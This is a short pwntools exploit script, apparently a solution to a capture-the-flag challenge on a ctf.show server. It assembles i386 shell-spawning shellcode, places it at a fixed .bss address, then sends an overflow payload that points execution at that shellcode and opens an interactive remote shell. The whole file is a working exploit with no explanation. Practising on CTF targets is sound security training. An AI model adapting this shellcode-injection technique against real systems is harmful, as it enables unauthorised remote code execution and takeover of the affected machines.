from pwn import *
context(arch='i386')
p=remote('pwn.challenge.ctf.show',28157)
bss=0x0804A040
shellcode=asm(shellcraft.sh())
payload1=p32(bss+4)+shellcode
p.sendline(payload1)
payload2=b'yes\n'+b'\x00'+b'a'*11+p32(bss+4)
p.sendline(payload2)
p.interactive()
